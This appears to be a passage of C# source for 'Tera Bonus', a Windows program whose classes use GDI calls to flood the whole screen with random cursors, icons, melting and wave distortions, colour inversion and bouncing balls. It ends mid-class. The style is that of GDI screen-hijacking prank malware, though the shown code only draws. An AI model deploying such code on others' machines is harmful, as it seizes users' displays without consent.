using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Media;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Runtime.Serialization;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Tera_Bonus
{
    internal static class Program
    {
        private class ReDrawer : Drawer
        {
            private int redrawCounter;

            public override void Draw(IntPtr hdc)
            {
                for (int i = 0; i < 3; i++)
                {
                    Redraw();
                }
                Thread.Sleep(random.Next(7500));
            }
        }
        private class Drawer1 : Drawer
        {
            private int redrawCounter;

            public override void Draw(IntPtr hdc)
            {
                try
                {
                    Graphics g = Graphics.FromHdc(hdc);

                    System.Type cursorsType = typeof(Cursors);
                    System.Reflection.PropertyInfo[] pros = cursorsType.GetProperties(System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
                    foreach (System.Reflection.PropertyInfo pro in pros)
                    {
                        Point drawPoint = new Point(random.Next(screenW), random.Next(screenH));
                        Cursor cur = (Cursor)pro.GetValue(null, null);
                        cur.Draw(g, new Rectangle(drawPoint, cur.Size));

                        Thread.Sleep(random.Next(2));
                    }
                    g.Dispose();
                    
                }
                catch { }
            }
        }
        [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true,
CallingConvention = CallingConvention.StdCall)]
        private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion,
out IntPtr piSmallVersion, int amountIcons);
        public static Icon Extract(string file, int number, bool largeIcon)
        {
            IntPtr large;
            IntPtr small;
            ExtractIconEx(file, number, out large, out small, 1);
            try
            {
                return Icon.FromHandle(largeIcon ? large : small);
            }
            catch
            {
                return null;
            }

        }
        private class Drawer2 : Drawer
        {
            private int redrawCounter;
            Icon app = Extract("user32.dll", 5, true);
            Icon warn_ico = Extract("user32.dll", 1, true);
            Icon no_ico = Extract("user32.dll", 3, true);
            public override void Draw(IntPtr hdc)
            {
                try
                {
                    Graphics g = Graphics.FromHdc(hdc);
                    Bitmap appicon = app.ToBitmap();
                    Bitmap warnicon = warn_ico.ToBitmap();
                    Bitmap noicon = no_ico.ToBitmap();
                    g.DrawImage(appicon, random.Next(screenW), random.Next(screenH),random.Next(200),random.Next(200));
                    g.DrawImage(warnicon, random.Next(screenW), random.Next(screenH), random.Next(200), random.Next(200));
                    g.DrawImage(noicon, random.Next(screenW), random.Next(screenH), random.Next(200), random.Next(200));
                }
                catch
                {

                }
                Thread.Sleep(random.Next(1));
            }
        }

        private class Drawer3 : Drawer
        {
            private int redrawCounter;

            public override void Draw(IntPtr hdc)
            {
                try
                {
                    IntPtr intPtr = CreateCompatibleDC(hdc);
                    IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                    SelectObject(intPtr, intPtr2);
                    BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                    Graphics g = Graphics.FromHdc(intPtr);
                    g.RotateTransform(random.Next(360));
                    Brush brush = new SolidBrush(Color.FromArgb(random.Next(255), random.Next(255), random.Next(255)));
                    g.DrawString("Tera Bonus.exe",new Font(FontFamily.GenericSansSerif, random.Next(1,100)),brush,random.Next(screenW),random.Next(screenH));
                    BitBlt(hdc, 0, 0, screenW, screenH, intPtr, random.Next(-1,2), random.Next(-1, 2), (int)CopyPixelOperation.SourceCopy);
                    DeleteObject(intPtr);
                    DeleteObject(intPtr2);
                }
                catch
                {

                }
                Thread.Sleep(random.Next(2));
            }
        }
        #region rgb to hsl
        public struct RGB
        {
            private byte _r;
            private byte _g;
            private byte _b;

            public RGB(byte r, byte g, byte b)
            {
                this._r = r;
                this._g = g;
                this._b = b;
            }

            public byte R
            {
                get { return this._r; }
                set { this._r = value; }
            }

            public byte G
            {
                get { return this._g; }
                set { this._g = value; }
            }

            public byte B
            {
                get { return this._b; }
                set { this._b = value; }
            }

            public bool Equals(RGB rgb)
            {
                return (this.R == rgb.R) && (this.G == rgb.G) && (this.B == rgb.B);
            }
        }

        public struct HSL
        {
            private int _h;
            private float _s;
            private float _l;

            public HSL(int h, float s, float l)
            {
                this._h = h;
                this._s = s;
                this._l = l;
            }

            public int H
            {
                get { return this._h; }
                set { this._h = value; }
            }

            public float S
            {
                get { return this._s; }
                set { this._s = value; }
            }

            public float L
            {
                get { return this._l; }
                set { this._l = value; }
            }

            public bool Equals(HSL hsl)
            {
                return (this.H == hsl.H) && (this.S == hsl.S) && (this.L == hsl.L);
            }
        }

        public static RGB HSLToRGB(HSL hsl)
        {
            byte r = 0;
            byte g = 0;
            byte b = 0;

            if (hsl.S == 0)
            {
                r = g = b = (byte)(hsl.L * 255);
            }
            else
            {
                float v1, v2;
                float hue = (float)hsl.H / 360;

                v2 = (hsl.L < 0.5) ? (hsl.L * (1 + hsl.S)) : ((hsl.L + hsl.S) - (hsl.L * hsl.S));
                v1 = 2 * hsl.L - v2;

                r = (byte)(255 * HueToRGB(v1, v2, hue + (1.0f / 3)));
                g = (byte)(255 * HueToRGB(v1, v2, hue));
                b = (byte)(255 * HueToRGB(v1, v2, hue - (1.0f / 3)));
            }

            return new RGB(r, g, b);
        }

        private static float HueToRGB(float v1, float v2, float vH)
        {
            if (vH < 0)
                vH += 1;

            if (vH > 1)
                vH -= 1;

            if ((6 * vH) < 1)
                return (v1 + (v2 - v1) * 6 * vH);

            if ((2 * vH) < 1)
                return v2;

            if ((3 * vH) < 2)
                return (v1 + (v2 - v1) * ((2.0f / 3) - vH) * 6);

            return v1;
        }
        #endregion
        private class Drawer4 : Drawer
        {
            private int redrawCounter;
            private static Random r = new Random();
            private int cc;
            private static int ballWidth = 200;
            private static int ballHeight = 200;
            private static int ballPosX = r.Next(Screen.PrimaryScreen.Bounds.Width-200);
            private static int ballPosY = r.Next(Screen.PrimaryScreen.Bounds.Height-200);
            private static int moveStepX = 10;
            private static int moveStepY = 10;

            public override void Draw(IntPtr hdc)
            {
                try
                {
                    
                    IntPtr intPtr = CreateCompatibleDC(hdc);
                    IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                    SelectObject(intPtr, intPtr2);
                    BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                    Graphics g = Graphics.FromHdc(intPtr);
                    double num = Screen.PrimaryScreen.Bounds.Width / 10;
                    int num9 = Screen.PrimaryScreen.Bounds.Height / 10;
                    float num2 = 0f;
                    float num3 = 0f;
                    float num4 = 10f;
                    for (float num5 = 0f; (double)num5 < num; num5 += 0.1f)
                    {
                        float num6 = (float)Math.Sin(num5);
                        redrawCounter++;
                        int num7 = redrawCounter;
                        int num8 = (int)(num2 * num4 + num3);
                        BitBlt(intPtr, num7, num8, 1, screenH, intPtr, num7, 0, 13369376);
                        BitBlt(intPtr, num7, screenH + num8, 1, screenH, intPtr, num7, 0, 13369376);
                        BitBlt(intPtr, num7, -screenH + num8, 1, screenH, intPtr, num7, 0, 13369376);
                        if (redrawCounter >= screenW)
                        {
                            redrawCounter = 0;
                        }
                        num2 = num6;
                    }
                    ballPosX += moveStepX;
                    if (
                        ballPosX < 0 ||
                        ballPosX + ballWidth > screenW
                        )
                    {
                        moveStepX = -moveStepX;
                    }

                    ballPosY += moveStepY;
                    if (
                        ballPosY < 0 ||
                        ballPosY + ballHeight > screenH
                        )
                    {
                        moveStepY = -moveStepY;

                    }
                    cc += 10;
                    HSL data = new HSL(cc%360, 1f, 0.5f);
                    RGB value = HSLToRGB(data);
                    Brush brush = new SolidBrush(Color.FromArgb(value.R,value.G,value.B));
                    Pen pen = new Pen(Color.Red);
                    g.FillEllipse(brush, ballPosX, ballPosY, ballWidth, ballHeight);
                    for (int i = 0; i < 100; i += 10)
                    {
                        g.DrawEllipse(pen, ballPosX-i/2, ballPosY-i/2, ballWidth+i, ballHeight+i);
                    }

                    BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 13369376);
                    DeleteObject(intPtr);
                    DeleteObject(intPtr2);
                    Thread.Sleep(random.Next(10));
                }
                catch { }
            }
        }

        private class Drawer5 : Drawer
        {
            private int redrawCounter;
            private int ads;
            public override void Draw(IntPtr hdc)
            {
                try
                {
                    IntPtr hcdc = CreateCompatibleDC(hdc);
                    IntPtr hBitmap = CreateCompatibleBitmap(hdc, screenW, screenH);
                    SelectObject(hcdc, hBitmap);
                    BitBlt(hcdc, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);

                    BitBlt(hcdc, 0, 0, screenW, screenH, hcdc, 20, 30, 13369376);
                    BitBlt(hcdc, 0, 0, screenW, screenH, hcdc, -screenW + 20, 30, 13369376);
                    BitBlt(hcdc, 0, 0, screenW, screenH, hcdc, 20, -screenH + 30, 13369376);
                    BitBlt(hcdc, 0, 0, screenW, screenH, hcdc, -screenW + 20, -screenH + 30, 13369376);

                    ads++;
                    if (ads >= random.Next(12))
                    {
                        SelectObject(hcdc, hBitmap);
                        BitBlt(hcdc, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);

                        //redrawCounter += 2;
                        //number += 2;
                        for (int i = 0; i < screenH; i += 2)
                        {
                            BitBlt(hcdc, -50, i, screenW, 1, hcdc, 0, i, 13369376);
                            BitBlt(hcdc, screenW - 50, i, screenW, 1, hcdc, 0, i, 13369376);
                            BitBlt(hcdc, 50, i - 1, screenW, 1, hcdc, 0, i - 1, 13369376);
                            BitBlt(hcdc, -screenW + 50, i - 1, screenW, 1, hcdc, 0, i - 1, 13369376);

                        }

                        //if (number >= screenH)
                        //{ number = 0; }
                        //if (redrawCounter >= screenH)
                        //{ redrawCounter = -1; }
                        ads = 0;
                    }
                    
                    BitBlt(hdc, 0, 0, screenW, screenH, hcdc, 0, 0, 13369376);
                    DeleteObject(hcdc);
                    DeleteObject(hBitmap);
                    Thread.Sleep(random.Next(10));
                }
                catch { }

            }
        }

        private class Drawer6 : Drawer
        {
            private int redrawCounter;

            private int redrawCounter2;

            public override void Draw(IntPtr hdc)
            {
                try
                {
                    IntPtr intPtr = CreateCompatibleDC(hdc);
                    IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                    SelectObject(intPtr, intPtr2);
                    BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                    double num = Screen.PrimaryScreen.Bounds.Width / 1;
                    int num9 = Screen.PrimaryScreen.Bounds.Height / 1;
                    float num2 = 0f;
                    float num3 = 10f;
                    float num4 = 10f;
                    for (float num5 = 0f; (double)num5 < num; num5 += 1f)
                    {
                        float num6 = (float)Math.Sin(num5);
                        redrawCounter++;
                        int num7 = redrawCounter;
                        int num8 = (int)(num2 * num4 + num3);
                        BitBlt(intPtr, num7, num8, 1, screenH, intPtr, num7, 0, 13369376);
                        BitBlt(intPtr, num7, screenH + num8, 1, screenH, intPtr, num7, 0, 13369376);
                        BitBlt(intPtr, num7, -screenH + num8, 1, screenH, intPtr, num7, 0, 13369376);
                        if (redrawCounter >= screenW)
                        {
                            redrawCounter = 0;
                        }
                        num2 = num6;
                    }
                    BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 13369376);
                    DeleteObject(intPtr);
                    DeleteObject(intPtr2);
                    Thread.Sleep(random.Next(10));
                }
                catch { }
            }
        }

        private class Drawer7 : Drawer
        {
            private int redrawCounter;
            private int cc;

            public override void Draw(IntPtr hdc)
            {
                try
                {
                    IntPtr hcdc = CreateCompatibleDC(hdc);
                    IntPtr hBitmap = CreateCompatibleBitmap(hdc, screenW, screenH);
                    SelectObject(hcdc, hBitmap);
                    BitBlt(hcdc, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                    Graphics g = Graphics.FromHdc(hcdc);
                        SelectObject(hcdc, hBitmap);
                        BitBlt(hcdc, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);

                    //redrawCounter += 2;
                    //number += 2;
                    for (int i = 0; i < screenH; i += 2)
                        {
                            BitBlt(hcdc, -50, i, screenW, 1, hcdc, 0, i, 13369376);
                            BitBlt(hcdc, screenW - 50, i, screenW, 1, hcdc, 0, i, 13369376);
                            BitBlt(hcdc, -25, i-1, screenW, 1, hcdc, 0, i-1, 13369376);
                            BitBlt(hcdc, screenW - 25, i-1, screenW, 1, hcdc, 0, i-1, 13369376);
                        }

                    //if (number >= screenH)
                    //{ number = 0; }
                    //if (redrawCounter >= screenH)
                    //{ redrawCounter = -1; }

                    for (int i = 0; i < screenH; i += 2)
                    {
                        cc += 1;

                        HSL data = new HSL(cc % 360, 1f, 0.5f);
                        RGB value = HSLToRGB(data);

                        Pen huePen = new Pen(Color.FromArgb(69, value.R, value.G, value.B), 2);
                        //IntPtr hgdiobj = CreateSolidBrush((uint)ColorTranslator.ToWin32(Color.FromArgb(value.R, value.G, value.B)));
                        //SelectObject(hcdc, hgdiobj);
                        //PatBlt(hcdc, i, 0, 1, screenH, CopyPixelOperation.PatInvert);
                        g.DrawLine(huePen, 0, i, screenW, i);
                    }
                    _BLENDFUNCTION blf = new _BLENDFUNCTION();
                    blf.BlendOp = AC_SRC_OVER;
                    blf.BlendFlags = 0;
                    blf.SourceConstantAlpha = (byte)64;
                    blf.AlphaFormat = 0;
                    AlphaBlend(hdc, 0, 0, screenW, screenH, hcdc, 0, 0, screenW, screenH, blf);
                    DeleteObject(hcdc);
                    DeleteObject(hBitmap);
                    Thread.Sleep(random.Next(10));
                }
                catch { }
            }
        }

        private class Drawer8 : Drawer
        {
            private int redrawCounter;

            public override void Draw(IntPtr hdc)
            {
                try
                {
                    IntPtr hcdc = CreateCompatibleDC(hdc);
                    IntPtr hBitmap = CreateCompatibleBitmap(hdc, screenW, screenH);
                    SelectObject(hcdc, hBitmap);
                    BitBlt(hcdc, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                    Graphics g = Graphics.FromHdc(hcdc);
                    POINT[] lppoint = new POINT[3];
                    int left = Screen.PrimaryScreen.Bounds.Left;
                    int top = Screen.PrimaryScreen.Bounds.Top;
                    int right = Screen.PrimaryScreen.Bounds.Right;
                    int bottom = Screen.PrimaryScreen.Bounds.Bottom;
                    int sk = random.Next(1, 26);
                    int a = random.Next(-5, 6);
                    int b = random.Next(-5, 6);
                    int c = random.Next(-5, 6);
                    int d = random.Next(-5, 6);
                    int e = random.Next(-5, 6);
                    int f = random.Next(-5, 6);
                    for (int i = 0; i < sk; i += 1)
                    {
                        lppoint[0].X = left - (a);
                        lppoint[0].Y = top + (b);
                        lppoint[1].X = right - (c);
                        lppoint[1].Y = top + (d);
                        lppoint[2].X = left + (e);
                        lppoint[2].Y = bottom - (f);
                        PlgBlt(hcdc, lppoint, hcdc, left, top, right - left, bottom - top, IntPtr.Zero, 0, 0);
                        BitBlt(hdc, 0, 0, screenW, screenH, hcdc, 0, 0, (int)CopyPixelOperation.SourceInvert);
                    }

                    DeleteObject(hcdc);
                    DeleteObject(hBitmap);
                    Thread.Sleep(random.Next(10));
                }
                catch
                {
                }
            }
        }

        private class Drawer9 : Drawer
        {
            private int redrawCounter;

            public unsafe override void Draw(IntPtr hdc)
            {
                try
                {
                    Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
                    Graphics.FromImage(bitmap).CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                    Graphics graphics = Graphics.FromImage(bitmap);
                    graphics.SmoothingMode = SmoothingMode.HighSpeed;
                    graphics.PixelOffsetMode = PixelOffsetMode.HighSpeed;
                    float num = 5f;
                    num = (100f + num) / 100f;
                    num *= num;
                    Bitmap bitmap2 = (Bitmap)bitmap.Clone();
                    BitmapData bitmapData = bitmap2.LockBits(new Rectangle(0, 0, bitmap2.Width, bitmap2.Height), ImageLockMode.ReadWrite, bitmap2.PixelFormat);
                    int height = bitmap2.Height;
                    int width = bitmap2.Width;
                    for (int i = 0; i < height; i++)
                    {
                        byte* ptr = (byte*)(void*)bitmapData.Scan0 + i * bitmapData.Stride;
                        int num2 = 0;
                        for (int j = 0; j < width; j++)
                        {
                            byte b = ptr[num2];
                            byte b2 = ptr[num2 + 1];
                            float num3 = (float)(int)ptr[num2 + 2] / 255f;
                            float num4 = (float)(int)b2 / 255f;
                            float num5 = (float)(int)b / 255f;
                            float num6 = ((num3 - 0.5f) * num + 0.5f) * 255f;
                            num4 = ((num4 - 0.5f) * num + 0.5f) * 255f;
                            num5 = ((num5 - 0.5f) * num + 0.5f) * 255f;
                            int num7 = (int)num6;
                            num7 = ((num7 > 255) ? 255 : num7);
                            num7 = ((num7 >= 0) ? num7 : 0);
                            int num8 = (int)num4;
                            num8 = ((num8 > 255) ? 255 : num8);
                            num8 = ((num8 >= 0) ? num8 : 0);
                            int num9 = (int)num5;
                            num9 = ((num9 > 255) ? 255 : num9);
                            num9 = ((num9 >= 0) ? num9 : 0);
                            ptr[num2] = (byte)num9;
                            ptr[num2 + 1] = (byte)num8;
                            ptr[num2 + 2] = (byte)num7;
                            num2 += 4;
                        }
                    }
                    bitmap2.UnlockBits(bitmapData);
                    Bitmap bitmap3 = new Bitmap(bitmap2);
                    IntPtr hdc2 = Graphics.FromHdc(GetDC(IntPtr.Zero)).GetHdc();
                    IntPtr intPtr = CreateCompatibleDC(hdc2);

                    SelectObject(intPtr, bitmap3.GetHbitmap());
                    for (int i = 0; i < screenH; i += 2)
                    {
                        BitBlt(intPtr, -1, i, screenW, 1, intPtr, 0, i, 13369376);
                        BitBlt(intPtr, screenW - 1, i, screenW, 1, intPtr, 0, i, 13369376);
                        BitBlt(intPtr, 1, i - 1, screenW, 1, intPtr, 0, i - 1, 13369376);
                        BitBlt(intPtr, -screenW + 1, i - 1, screenW, 1, intPtr, 0, i - 1, 13369376);
                    }
                    BitBlt(hdc2, 0, 0, bitmap3.Width, bitmap3.Height, intPtr, 0, 0, 13369376);
                    //BitBlt(hdc2, 0, 0, bitmap3.Width, bitmap3.Height, intPtr, screenW - 10, -screenH+10, 13369376);
                    //BitBlt(hdc2, 0, 0, bitmap3.Width, bitmap3.Height, intPtr, 10, -screenH+10, 13369376);
                    DeleteObject(hdc2);
                    DeleteObject(intPtr);
                    Thread.Sleep(random.Next(10));
                }
                catch { }
            }
        }

        private class Drawer10 : Drawer
        {
            private int redrawCounter2; 
            public override void Draw(IntPtr hdc)
            {
                try
                {
                    IntPtr intPtr = CreateCompatibleDC(hdc);
                    IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                    SelectObject(intPtr, intPtr2);
                    BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                    float x1 = 0;
                    float y1 = 0;

                    float y2 = 0;

                    float yEx = 0;
                    float ef = 5;

                    for (float x = 0; x < Screen.PrimaryScreen.Bounds.Height / 10; x += 0.1F)
                    {
                        y2 = (float)Math.Sin(x);
                        redrawCounter2 += 1;
                        int rd2 = redrawCounter2;
                        int f2int = (int)(y1 * ef + yEx);
                        BitBlt(intPtr, f2int, 0 + rd2, screenW, 1, intPtr, 0, 0 + rd2, 13369376);
                        BitBlt(intPtr, screenW + f2int, 0 + rd2, screenW, 1, intPtr, 0, 0 + rd2, 13369376);
                        BitBlt(intPtr, -screenW + f2int, 0 + rd2, screenW, 1, intPtr, 0, 0 + rd2, 13369376);
                        if (redrawCounter2 >= screenH) { redrawCounter2 = 0; }
                        x1 = x;
                        y1 = y2;
                    }

                    BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 13369376);
                    ReleaseDC(intPtr, intPtr2);
                    DeleteObject(intPtr);
                    DeleteObject(intPtr2);
                    Thread.Sleep(random.Next(10));
                }
                catch
                {
                }
            }
        }

        private class Drawer11 : Drawer
        {
            private int redrawCounter;

            private int redrawCounter2;

            public override void Draw(IntPtr hdc)
            {
                try
                {
                    IntPtr intPtr = CreateCompatibleDC(hdc);
                    IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                    SelectObject(intPtr, intPtr2);
                    BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                    double num = Screen.PrimaryScreen.Bounds.Width / 1000;
                    double num2 = Screen.PrimaryScreen.Bounds.Height / 1000;
                    float num3 = 0f;
                    float num4 = 0f;
                    float num5 = 50f;
                    for (float num6 = 0f; (double)num6 < num; num6 += 0.001f)
                    {
                        float num7 = (float)Math.Sin(num6);
                        redrawCounter++;
                        int num8 = redrawCounter;
                        int num9 = (int)Math.Round(num3 * num5 + num4);
                        BitBlt(intPtr, num8, num9, 1, screenH, intPtr, num8, 0, 13369376);
                        BitBlt(intPtr, num8, screenH + num9, 1, screenH, intPtr, num8, 0, 13369376);
                        BitBlt(intPtr, num8, -screenH + num9, 1, screenH, intPtr, num8, 0, 13369376);
                        if (redrawCounter >= screenW)
                        {
                            redrawCounter = 0;
                        }
                        num3 = num7;
                    }
                    for (float num10 = 0f; (double)num10 < num2; num10 += 0.001f)
                    {
                        float num11 = (float)Math.Sin(num10);
                        redrawCounter2++;
                        int num12 = redrawCounter2;
                        int num13 = (int)Math.Round(num3 * num5 + num4);
                        BitBlt(intPtr, num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
                        BitBlt(intPtr, screenW + num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
                        BitBlt(intPtr, -screenW + num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
                        if (redrawCounter2 >= screenH)
                        {
                            redrawCounter2 = 0;
                        }
                        num3 = num11;
                    }
                    BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 13369376);
                    DeleteObject(intPtr);
                    DeleteObject(intPtr2);
                    Thread.Sleep(random.Next(10));
                }
                catch { }
            }
        }

        private class Drawer12 : Drawer
        {
            private int redrawCounter;
            private int redrawCounter2;
            private static Random r = new Random();
            private int cc;
            private static int ballWidth = 500;
            private static int ballHeight = 500;
            private static int ballPosX = r.Next(Screen.PrimaryScreen.Bounds.Width - 600);
            private static int ballPosY = r.Next(Screen.PrimaryScreen.Bounds.Height - 600);
            private static int moveStepX = 50;
            private static int moveStepY = 50;

            public override void Draw(IntPtr hdc)
            {
                try
                {
                    IntPtr intPtr = CreateCompatibleDC(hdc);
                    IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                    SelectObject(intPtr, intPtr2);
                    BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                    Graphics g = Graphics.FromHdc(intPtr);
                    double num = Screen.PrimaryScreen.Bounds.Width / 1000;
                    double num2 = Screen.PrimaryScreen.Bounds.Height / 1000;
                    float num3 = 0f;
                    float num4 = 0f;
                    float num5 = 50f;
                    for (float num6 = 0f; (double)num6 < num; num6 += 0.001f)
                    {
                        float num7 = (float)Math.Sin(num6);
                        redrawCounter++;
                        int num8 = redrawCounter;
                        int num9 = (int)Math.Round(num3 * num5 + num4);
                        BitBlt(intPtr, num8, num9, 1, screenH, intPtr, num8, 0, 13369376);
                        BitBlt(intPtr, num8, screenH + num9, 1, screenH, intPtr, num8, 0, 13369376);
                        BitBlt(intPtr, num8, -screenH + num9, 1, screenH, intPtr, num8, 0, 13369376);
                        if (redrawCounter >= screenW)
                        {
                            redrawCounter = 0;
                        }
                        num3 = num7;
                    }
                    for (float num10 = 0f; (double)num10 < num2; num10 += 0.001f)
                    {
                        float num11 = (float)Math.Sin(num10);
                        redrawCounter2++;
                        int num12 = redrawCounter2;
                        int num13 = (int)Math.Round(num3 * num5 + num4);
                        BitBlt(intPtr, num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
                        BitBlt(intPtr, screenW + num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
                        BitBlt(intPtr, -screenW + num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
                        if (redrawCounter2 >= screenH)
                        {
                            redrawCounter2 = 0;
                        }
                        num3 = num11;
                    }
                    ballPosX += moveStepX;
                    if (
                        ballPosX < 0 ||
                        ballPosX + ballWidth > screenW
                        )
                    {
                        moveStepX = -moveStepX;
                    }

                    ballPosY += moveStepY;
                    if (
                        ballPosY < 0 ||
                        ballPosY + ballHeight > screenH
                        )
                    {
                        moveStepY = -moveStepY;

                    }
                    cc += 10;
                    HSL data = new HSL(cc % 360, 1f, 0.5f);
                    RGB value = HSLToRGB(data);
                    Brush brush = new SolidBrush(Color.FromArgb(value.R, value.G, value.B));
                    Pen pen = new Pen(Color.Red);
                    g.FillEllipse(brush, ballPosX, ballPosY, ballWidth, ballHeight);
                    BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, (int)CopyPixelOperation.SourceInvert);
                    DeleteObject(intPtr);
                    DeleteObject(intPtr2);
                    Thread.Sleep(random.Next(10));
                }
                catch { }
            }
        }

        private class Drawer13 : Drawer
        {
            private int redrawCounter;
            private int redrawCounter2;
            private static Random r = new Random();
            private int cc;
            private static int ballWidth = 500;
            private static int ballHeight = 500;
            private static int ballPosX = r.Next(Screen.PrimaryScreen.Bounds.Width - 600);
            private static int ballPosY = r.Next(Screen.PrimaryScreen.Bounds.Height - 600);
            private static int moveStepX = 50;
            private static int moveStepY = 50;

            public override void Draw(IntPtr hdc)
            {
                try
                {
                    IntPtr intPtr = CreateCompatibleDC(hdc);
                    IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                    SelectObject(intPtr, intPtr2);
                    BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                    Graphics g = Graphics.FromHdc(intPtr);
                    double num = Screen.PrimaryScreen.Bounds.Width / 1000;
                    double num2 = Screen.PrimaryScreen.Bounds.Height / 1000;
                    float num3 = 0f;
                    float num4 = 0f;
                    float num5 = 50f;
                    for (float num6 = 0f; (double)num6 < num; num6 += 0.001f)
                    {
                        float num7 = (float)Math.Sin(num6);
                        redrawCounter++;
                        int num8 = redrawCounter;
                        int num9 = (int)Math.Round(num3 * num5 + num4);
                        BitBlt(intPtr, num8, num9, 1, screenH, intPtr, num8, 0, 13369376);
                        BitBlt(intPtr, num8, screenH + num9, 1, screenH, intPtr, num8, 0, 13369376);
                        BitBlt(intPtr, num8, -screenH + num9, 1, screenH, intPtr, num8, 0, 13369376);
                        if (redrawCounter >= screenW)
                        {
                            redrawCounter = 0;
                        }
                        num3 = num7;
                    }
                    for (float num10 = 0f; (double)num10 < num2; num10 += 0.001f)
                    {
                        float num11 = (float)Math.Sin(num10);
                        redrawCounter2++;
                        int num12 = redrawCounter2;
                        int num13 = (int)Math.Round(num3 * num5 + num4);
                        BitBlt(intPtr, num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
                        BitBlt(intPtr, screenW + num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
                        BitBlt(intPtr, -screenW + num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
                        if (redrawCounter2 >= screenH)
                        {
                            redrawCounter2 = 0;
                        }
                        num3 = num11;
                    }
                    ballPosX += moveStepX;
                    if (
                        ballPosX < 0 ||
                        ballPosX + ballWidth > screenW
                        )
                    {
                        moveStepX = -moveStepX;
                    }

                    ballPosY += moveStepY;
                    if (
                        ballPosY < 0 ||
                        ballPosY + ballHeight > screenH
                        )
                    {
                        moveStepY = -moveStepY;

                    }
                    cc += 10;
                    HSL data = new HSL(cc % 360, 1f, 0.5f);
                    RGB value = HSLToRGB(data);
                    Brush brush = new SolidBrush(Color.FromArgb(value.R, value.G, value.B));
                    Pen pen = new Pen(Color.Red);
                    g.FillEllipse(brush, ballPosX, ballPosY, ballWidth, ballHeight);
                    BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, (int)CopyPixelOperation.SourceErase);
                    DeleteObject(intPtr);
                    DeleteObject(intPtr2);
                    Thread.Sleep(random.Next(10));
                }
                catch { }
            }
        }

        private class Drawer14 : Drawer
        {
            private int cc;

            public override void Draw(IntPtr hdc)
            {
                try
                {
                    IntPtr intPtr = CreateCompatibleDC(hdc);
                    IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                    SelectObject(intPtr, intPtr2);
                    BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                    BitBlt(intPtr, 0, 0, screenW, screenH, hdc, random.Next(-10, 10), random.Next(-10, 10), (int)CopyPixelOperation.SourceInvert);
                    cc += 10;
                    HSL data = new HSL(cc % 360, 1f, 0.5f);
                    RGB value = HSLToRGB(data);
                    IntPtr hgdiobj = CreateSolidBrush((uint)ColorTranslator.ToWin32(Color.FromArgb(value.R, value.G, value.B)));
                    SelectObject(intPtr, hgdiobj);
                    PatBlt(intPtr, 0, 0, screenW, screenH, CopyPixelOperation.PatInvert);
                    _BLENDFUNCTION blf = new _BLENDFUNCTION();
                    blf.BlendOp = AC_SRC_OVER;
                    blf.BlendFlags = 0;
                    blf.SourceConstantAlpha = (byte)16;
                    blf.AlphaFormat = 0;
                    AlphaBlend(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, screenW, screenH, blf);
                    DeleteObject(intPtr);
                    DeleteObject(intPtr2);
                    Thread.Sleep(random.Next(10));
                }
                catch { }
            }
        }

        private class Drawer15 : Drawer
        {
            private int redrawCounter;
            private int redrawCounter2;
            private static Random r = new Random();
            private int cc;
            private static int ballWidth = 0;
            private static int ballHeight = 0;
            private static int ballPosX = r.Next(Screen.PrimaryScreen.Bounds.Width - 600);
            private static int ballPosY = r.Next(Screen.PrimaryScreen.Bounds.Height - 600);
            private static int moveStepX = r.Next(1,17);
            private static int moveStepY = r.Next(1, 17);
            private static int ballWidth1 = 0;
            private static int ballHeight1 = 0;
